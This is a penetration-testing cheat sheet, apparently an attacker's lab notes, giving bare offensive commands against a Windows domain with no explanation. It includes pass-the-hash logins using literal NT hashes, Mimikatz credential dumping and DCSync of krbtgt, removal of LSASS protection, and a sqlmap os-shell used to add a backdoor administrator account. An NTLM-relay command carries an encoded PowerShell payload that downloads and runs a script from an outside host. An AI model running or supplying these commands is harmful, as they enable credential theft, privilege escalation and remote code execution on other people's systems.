# Cheat Sheet - Exploitations and Shell

## Table of Content

* [Metasploit](#Metasploit)
* [Impacket](#Impacket)
* [Mimikatz](#Mimikatz)
* [Evil-WinRM](#Evil)
* [SQLMap](#SQLMap)
* [Relay Hash](#Relay)
* [PrintSpoofer](#Spoofer)
* [PSSession](#Session)
* [PsExec](#Exec)

### Metasploit<a name="Metasploit"></a>

```bash
auxiliary/scanner/portscan/tcp
exploit/multi/script/web_delivery
exploit/windows/local/bypassuac_fodhelper
post/windows/gather/credentials/enum_laps

meterpreter > load powershell
meterpreter > load incognito
meterpreter > load kiwi
meterpreter > hashdump

meterpreter > execute -H -f notepad
Process 3400 created.
meterpreter > migrate 3400
```

### Impacket<a name="Impacket"></a>
```bash
# Normal Usage
python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@dc03.sinhack.com -hashes "aad3b435b51404eeaad3b435b51404ee:5f3421ca3b673adfdc2418f368ca3760" -target-ip 192.168.x.x

proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py sinhack.com/administrator@dc01.dev.sinhack.com -hashes "aad3b435b51404eeaad3b435b51404ee:0264d5b0a74d30f13f1fec243e8ac3cb" -target-ip 172.16.10.12 -dc-ip 172.16.10.11

proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py v0lk3n@sinhack.com -target-ip 172.16.x.x

# With Kerberos Authentication
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py SINHACK.COM/v0lk3n@dc01.sinhack.com -k -no-pass -debug

proxychains python3 /usr/share/doc/python3-impacket/examples/secretsdump.py sinhack.com/v0lk3n@DC01.SINHACK.COM -k -no-pass

# Examine the list of domain users with GetADUsers.py and Kerberos
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.x.x SINHACK.COM/Administrator

# Get a list of the SPNs available to our Kerberos user.
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.x.x SINHACK.COM/Administrator

```

### Mimikatz<a name="Mimikatz"></a>

```bash
mimikatz # privilege::debug

mimikatz # sekurlsa::pth /user:admin /domain:dev1 /ntlm:1242C26BCD32E7A70F2EB3B9F05C425E /run:"mstsc.exe /restrictedadmin"

mimikatz # sekurlsa::logonpasswords

mimikatz # lsadump::dcsync /domain:sinhack.com /user:krbtgt
mimikatz # lsadump::dcsync /domain:sinhack.com /user:Administrator
mimikatz # lsadump::dcsync /domain:sinhack.com /user:sinhack\Administrator

#Disable the LSA protection and dump the credentials.
## Upload the mimidrv.sys to the victim and load the driver with Mimikatz
mimikatz # !+

## Disable the PPL protection for LSASS :
mimikatz # !processprotect /process:lsass.exe /remove

```

### Evil WinRm<a name="Evil"></a>

```bash
sudo gem install evil-winrm

proxychains evil-winrm -i 172.16.x.x -u v0lk3n -H NT_HASH
proxychains evil-winrm -i 172.16.x.x -u v0lk3n -H 6DB6CFDF45964A02A80E85A7AB9F4314
```

### SQLMap<a name="SQLMap"></a>

```bash
sqlmap -u 'TARGET_URL' --batch --dbs
sqlmap -u 'TARGET_URL' --os-shell --flush-session

os-shell> net user /add v0lk3n Fucked123!
do you want to retrieve the command standard output? [Y/n/a] n
os-shell> net localgroup administrators v0lk3n /add
do you want to retrieve the command standard output? [Y/n/a] n
```

### Relay Hash<a name="Relay"></a>

```bash
sudo responder -I tun0
sudo proxychains impacket-ntlmrelayx --no-http-server -smb2support -t 172.16.x.x -c 'powershell -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMQAxADIAOgA4ADAAOAAwAC8AcABzAHIAdQBuAG4AZQByAC4AdAB4AHQAJwApAA=='
```

### PrintSpoofer<a name="Spoofer"></a>

```bash
PrintSpoofer64.exe -i -c cmd.exe
```

###PSSession<a name="Session"></a>

```bash
Enter-PSSession -Computer secret01.dev.sinhack.com
```

### PsExec<a name="Exec"></a>

```bash
PsExec64.exe \\dev1.secret.sinhack.com cmd
```
